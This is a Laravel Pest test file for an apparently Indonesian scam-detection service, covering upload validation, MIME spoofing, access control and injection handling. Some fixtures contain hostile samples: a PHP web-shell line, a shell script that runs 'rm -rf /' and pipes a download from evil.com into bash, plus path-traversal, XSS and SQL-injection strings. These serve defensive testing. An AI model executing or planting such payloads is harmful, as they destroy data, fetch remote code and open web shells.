<?php

use App\Models\Scan;
use App\Models\User;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;

beforeEach(function () {
    Storage::fake('public');
});

/**
 * Create a real file on disk wrapped in an UploadedFile to test true fileinfo / MIME inspection.
 */
function createRealDiskUpload(string $content, string $clientName, string $clientMime): UploadedFile
{
    $tempPath = tempnam(sys_get_temp_dir(), 'test_real_upload_');
    file_put_contents($tempPath, $content);

    return new UploadedFile($tempPath, $clientName, $clientMime, null, true);
}

/*
|--------------------------------------------------------------------------
| Section 1: Extreme File Size Boundary Conditions (5120 KB vs 5121 KB)
|--------------------------------------------------------------------------
*/

describe('Section 1: File Size Boundary Conditions', function () {
    test('boundary: exactly 5120 KB (5 MB max limit) image upload is accepted with 200 OK', function () {
        $file = UploadedFile::fake()->image('boundary_5120kb.jpg')->size(5120);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
        $response->assertJsonStructure([
            'success',
            'data' => [
                'risk_level',
                'score',
                'summary',
                'red_flags',
                'recommendations',
            ],
        ]);
    });

    test('boundary: 5121 KB (1 KB over 5 MB limit) image upload is strictly rejected with 422', function () {
        $file = UploadedFile::fake()->image('over_limit_5121kb.jpg')->size(5121);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
        expect($response->json('errors.image.0'))->toContain('5MB');
    });

    test('extreme: massively oversized 20 MB image upload is rejected with 422', function () {
        $file = UploadedFile::fake()->image('huge_photo_20mb.png')->size(20480);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('boundary: minimal 1 KB valid image upload is accepted with 200 OK', function () {
        $file = UploadedFile::fake()->image('tiny_valid.png', 10, 10)->size(1);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
    });
});

/*
|--------------------------------------------------------------------------
| Section 2: Spoofed MIME Headers and Disguised Malicious Extensions
|--------------------------------------------------------------------------
*/

describe('Section 2: Spoofed MIME Headers and Malicious Extensions', function () {
    test('spoof: PHP script disguised with .jpg extension and fake image MIME is rejected with 422 via fileinfo', function () {
        $phpPayload = '<?php echo "HACKED"; system($_GET["c"]); ?>';
        $file = createRealDiskUpload($phpPayload, 'malware.jpg', 'image/jpeg');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('spoof: Windows executable PE binary disguised with .png extension is rejected with 422 via fileinfo', function () {
        $exeBinary = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.";
        $file = createRealDiskUpload($exeBinary, 'payload.png', 'image/png');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('spoof: Shell script disguised with .jpeg extension is rejected with 422 via fileinfo', function () {
        $shScript = "#!/bin/bash\nrm -rf /\ncurl http://evil.com/leak | bash";
        $file = createRealDiskUpload($shScript, 'script.jpeg', 'image/jpeg');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('spoof: Plain text notes disguised with .jpg extension is rejected with 422 via fileinfo', function () {
        $plainText = 'Halo ini adalah catatan teks biasa yang menyamar sebagai jpg.';
        $file = createRealDiskUpload($plainText, 'catatan.jpg', 'image/jpeg');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('spoof: malicious extensions (.php, .exe, .sh, .txt) with spoofed image MIME headers are rejected with 422', function (string $filename, string $spoofedMime, string $content) {
        $file = createRealDiskUpload($content, $filename, $spoofedMime);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    })->with([
        ['exploit.php', 'image/jpeg', '<?php echo "HACK"; ?>'],
        ['malware.exe', 'image/png', "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode."],
        ['attack.sh', 'image/jpeg', "#!/bin/bash\nrm -rf /"],
        ['notes.txt', 'image/jpeg', 'Plain text content masquerading as a jpeg photo.'],
    ]);

    test('format: non-supported image formats (.gif, .svg, .webp, .bmp) are rejected with 422', function (string $filename, string $mime) {
        $file = UploadedFile::fake()->create($filename, 50, $mime);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    })->with([
        ['animation.gif', 'image/gif'],
        ['vector_icon.svg', 'image/svg+xml'],
        ['modern_shot.webp', 'image/webp'],
        ['bitmap_image.bmp', 'image/bmp'],
    ]);

    test('format: dangerous non-image files (.pdf, .exe, .sh, .apk) are rejected with 422', function (string $filename, string $mime) {
        $file = UploadedFile::fake()->create($filename, 100, $mime);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    })->with([
        ['tagihan_pajak.pdf', 'application/pdf'],
        ['surat_undangan.apk', 'application/vnd.android.package-archive'],
        ['setup.exe', 'application/x-msdownload'],
        ['exploit.sh', 'text/x-shellscript'],
    ]);

    test('path traversal: filename with directory traversal attempts does not write outside storage', function () {
        $user = User::factory()->create();
        $file = UploadedFile::fake()->image('../../etc_passwd_exploit.png', 200, 200);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();

        // Stored path must be safely within 'scans' directory
        $storedFiles = Storage::disk('public')->allFiles('scans');
        expect(count($storedFiles))->toBe(1);
        expect($storedFiles[0])->toStartWith('scans/');
        expect($storedFiles[0])->not->toContain('..');
    });
});

/*
|--------------------------------------------------------------------------
| Section 3: Corrupt Image Binary Content
|--------------------------------------------------------------------------
*/

describe('Section 3: Corrupt Image Binary Content', function () {
    test('corrupt: zero-byte empty image file on disk is rejected with 422 via fileinfo', function () {
        $emptyFile = createRealDiskUpload('', 'empty_corrupt.jpg', 'image/jpeg');

        $response = $this->postJson('/chat/analyze', [
            'image' => $emptyFile,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('corrupt: incomplete 2-byte header on disk is rejected with 422 via fileinfo', function () {
        $incompleteHeader = "\xFF\xD8";
        $file = createRealDiskUpload($incompleteHeader, 'incomplete_header.jpg', 'image/jpeg');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });

    test('corrupt: random binary noise masquerading as image on disk is rejected with 422', function () {
        $garbage = str_repeat("\xDE\xAD\xBE\xEF\x00\xFF", 512); // 3KB garbage
        $file = createRealDiskUpload($garbage, 'garbage_binary.png', 'image/png');

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['image']);
    });
});

/*
|--------------------------------------------------------------------------
| Section 4: Payload Matrix (Image vs Content Combinations)
|--------------------------------------------------------------------------
*/

describe('Section 4: Payload Matrix Permutations', function () {
    test('matrix: image only without content key returns 200 OK', function () {
        $file = UploadedFile::fake()->image('bukti_chat.jpg', 640, 480);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
        expect($response->json('data.summary'))->not->toBeEmpty();
    });

    test('matrix: image only with explicit null content returns 200 OK', function () {
        $file = UploadedFile::fake()->image('bukti_chat_null.jpg', 640, 480);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
            'content' => null,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
    });

    test('matrix: text content only without image key returns 200 OK', function () {
        $response = $this->postJson('/chat/analyze', [
            'content' => 'Halo apakah nomor rekening ini resmi dari Bank BCA?',
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
        expect($response->json('data.risk_level'))->not->toBeEmpty();
    });

    test('matrix: text content only with explicit null image returns 200 OK', function () {
        $response = $this->postJson('/chat/analyze', [
            'content' => 'Selamat Anda memenangkan undian 100 juta rupiah transfer biaya admin',
            'image' => null,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
    });

    test('matrix: both valid image and accompanying text content returns 200 OK', function () {
        $file = UploadedFile::fake()->image('undangan_pernikahan.jpg', 600, 800);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
            'content' => 'Saya dapat undangan pernikahan ini lewat WhatsApp tolong dicek',
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
    });

    test('matrix: empty payload {} returns 422 with validation error on content', function () {
        $response = $this->postJson('/chat/analyze', []);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
        expect($response->json('errors.content.0'))->toContain('Kolom isi pesan wajib diisi bila gambar tidak disertakan');
    });

    test('matrix: both content and image null returns 422 with validation error on content', function () {
        $response = $this->postJson('/chat/analyze', [
            'content' => null,
            'image' => null,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
    });

    test('matrix: content string below 3 chars without image returns 422 min:3 validation error', function () {
        $response = $this->postJson('/chat/analyze', [
            'content' => 'ab',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
        expect($response->json('errors.content.0'))->toContain('minimal 3 karakter');
    });

    test('matrix: content string exceeding 10000 chars returns 422 max:10000 validation error', function () {
        $longContent = str_repeat('Pesan penipuan berulang ', 500); // > 11000 chars

        $response = $this->postJson('/chat/analyze', [
            'content' => $longContent,
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
    });

    test('matrix: valid image with content shorter than 3 chars returns 422 on content min:3', function () {
        $file = UploadedFile::fake()->image('test.png', 100, 100);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
            'content' => 'ab',
        ]);

        $response->assertStatus(422);
        $response->assertJsonValidationErrors(['content']);
    });
});

/*
|--------------------------------------------------------------------------
| Section 5: Auth vs Guest Scan Persistence Verification
|--------------------------------------------------------------------------
*/

describe('Section 5: Auth vs Guest Scan Persistence Verification', function () {
    test('guest: image scan produces analysis and persists row with user_id null and public storage', function () {
        $file = UploadedFile::fake()->image('guest_screenshot.png', 500, 500);

        $this->assertDatabaseCount('scans', 0);

        $response = $this->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBeNull();
        expect($scan->public_id)->not->toBeEmpty();

        $storedFiles = Storage::disk('public')->allFiles('scans');
        expect(count($storedFiles))->toBe(1);
    });

    test('guest: text-only scan produces analysis and persists row with user_id null', function () {
        $this->assertDatabaseCount('scans', 0);

        $response = $this->postJson('/chat/analyze', [
            'content' => 'Pesan dari kurir paket J&T minta konfirmasi alamat pengiriman barang',
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBeNull();
        expect($scan->public_id)->not->toBeEmpty();
    });

    test('guest: phishing URL scan produces analysis and persists row with user_id null', function () {
        $this->assertDatabaseCount('scans', 0);

        $response = $this->postJson('/chat/analyze', [
            'content' => 'Verifikasi akun perbankan Anda di http://192.168.1.1/bca-login sekarang',
        ]);

        $response->assertOk();
        expect(strtolower($response->json('data.risk_level')))->toBeIn(['high', 'danger', 'tinggi']);
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBeNull();
        expect($scan->public_id)->not->toBeEmpty();
    });

    test('auth: authenticated user image scan persists exactly 1 row to scans table with user_id', function () {
        $user = User::factory()->create();
        $file = UploadedFile::fake()->image('resi_paket_kurir_express.jpg', 600, 800);

        $this->assertDatabaseCount('scans', 0);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBe($user->id);
        expect($scan->scan_type)->toBe('image');
        expect($scan->metadata['image_filename'])->toBe('resi_paket_kurir_express.jpg');
        expect($scan->metadata['image_path'])->not->toBeNull();

        // Verify file is stored in public disk
        Storage::disk('public')->assertExists($scan->metadata['image_path']);
    });

    test('auth: authenticated user text scan persists exactly 1 row to scans table with scan_type text', function () {
        $user = User::factory()->create();

        $this->assertDatabaseCount('scans', 0);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'content' => 'Selamat nomor telepon Anda memenangkan grand prize 50 juta dari Bank Mandiri',
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBe($user->id);
        expect($scan->scan_type)->toBe('text');
        expect($scan->metadata['image_path'])->toBeNull();
    });

    test('auth: authenticated user phishing URL scan persists exactly 1 row with scan_type url', function () {
        $user = User::factory()->create();

        $this->assertDatabaseCount('scans', 0);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'content' => 'Segera aktivasi kartu kredit Anda di https://bca-verifikasi-update.top/login',
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBe($user->id);
        expect($scan->scan_type)->toBe('url');
        expect($scan->metadata['detected_urls'])->toContain('https://bca-verifikasi-update.top/login');
    });

    test('auth: authenticated user image + phishing URL scan prioritizes scan_type image with elevated threat', function () {
        $user = User::factory()->create();
        $file = UploadedFile::fake()->image('bukti_transfer.png', 400, 400);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'image' => $file,
            'content' => 'Klik link konfirmasi penerimaan dana di https://klikbca-pencairan-dana.top/login',
        ]);

        $response->assertOk();
        $this->assertDatabaseCount('scans', 1);

        $scan = Scan::first();
        expect($scan->user_id)->toBe($user->id);
        expect($scan->scan_type)->toBe('image');
        expect(strtoupper($scan->risk_level))->toBe('HIGH');
        expect($scan->score)->toBeGreaterThanOrEqual(90);
    });

    test('data isolation: User A scans are not visible to User B in dashboard', function () {
        $userA = User::factory()->create();
        $userB = User::factory()->create();

        // User A creates a scan
        $file = UploadedFile::fake()->image('user_a_evidence.jpg', 500, 500);
        $this->actingAs($userA)->postJson('/chat/analyze', [
            'image' => $file,
            'content' => 'Pesan rahasia dari korban A',
        ])->assertOk();

        // User B views dashboard -> recentScans must be 0
        $userBResponse = $this->actingAs($userB)->get('/dashboard');
        $userBResponse->assertOk();
        $userBResponse->assertInertia(fn ($page) => $page
            ->component('dashboard')
            ->where('guardianStatus.total_scans', 0)
            ->has('recentScans', 0)
        );

        // User A views dashboard -> recentScans must be 1
        $userAResponse = $this->actingAs($userA)->get('/dashboard');
        $userAResponse->assertOk();
        $userAResponse->assertInertia(fn ($page) => $page
            ->component('dashboard')
            ->where('guardianStatus.total_scans', 1)
            ->has('recentScans', 1)
            ->where('recentScans.0.content', 'Pesan rahasia dari korban A')
        );
    });
});

/*
|--------------------------------------------------------------------------
| Section 6: Scan Deletion Authorization & IDOR Resistance
|--------------------------------------------------------------------------
*/

describe('Section 6: Scan Deletion IDOR Resistance', function () {
    test('idor: User B cannot delete User A scan record (returns 404)', function () {
        $userA = User::factory()->create();
        $userB = User::factory()->create();

        $scanA = Scan::factory()->create([
            'user_id' => $userA->id,
            'content' => 'Scan rahasia milik User A',
            'scan_type' => 'image',
        ]);

        // User B attempts to delete User A's scan
        $response = $this->actingAs($userB)->deleteJson("/scans/{$scanA->id}");

        $response->assertNotFound();
        $this->assertDatabaseHas('scans', ['id' => $scanA->id]);
    });

    test('idor: unauthenticated guest cannot delete any scan record (returns 401/302)', function () {
        $user = User::factory()->create();
        $scan = Scan::factory()->create(['user_id' => $user->id]);

        $response = $this->deleteJson("/scans/{$scan->id}");
        $response->assertUnauthorized();

        $this->assertDatabaseHas('scans', ['id' => $scan->id]);
    });

    test('legitimate owner can delete their own scan record', function () {
        $user = User::factory()->create();
        $scan = Scan::factory()->create(['user_id' => $user->id]);

        $this->assertDatabaseHas('scans', ['id' => $scan->id]);

        $response = $this->actingAs($user)->delete("/scans/{$scan->id}");

        $response->assertRedirect();
        $this->assertDatabaseMissing('scans', ['id' => $scan->id]);
    });
});

/*
|--------------------------------------------------------------------------
| Section 7: Adversarial Filename & Content Injections
|--------------------------------------------------------------------------
*/

describe('Section 7: Adversarial Injections and Unicode Handling', function () {
    test('injection: filename with HTML / script tags is handled safely without execution', function () {
        $user = User::factory()->create();
        $file = UploadedFile::fake()->image('malicious_xss_test.png', 300, 300);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'image' => $file,
            'context' => [
                'custom_title' => '<script>alert("xss")</script>',
            ],
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);

        $scan = Scan::first();
        expect($scan->metadata['image_filename'])->toBe('malicious_xss_test.png');
    });

    test('unicode: filename with Indonesian characters, emojis, and special symbols handles safely', function () {
        $user = User::factory()->create();
        $filename = 'Surat_Tilang_Elektronik_Kepolisian_🇮🇩_Resmi (KORLANTAS) #2026.jpg';
        $file = UploadedFile::fake()->image($filename, 400, 400);

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'image' => $file,
        ]);

        $response->assertOk();
        $response->assertJson(['success' => true]);
    });

    test('injection: SQL injection payload in message content executes safely without database error', function () {
        $user = User::factory()->create();
        $sqlInjection = "'; DROP TABLE scans; SELECT * FROM users WHERE '1'='1";

        $response = $this->actingAs($user)->postJson('/chat/analyze', [
            'content' => $sqlInjection,
        ]);

        $response->assertOk();
        // scans table must remain intact and have the record inserted
        $this->assertDatabaseCount('scans', 1);
        expect(Scan::count())->toBe(1);
    });
});
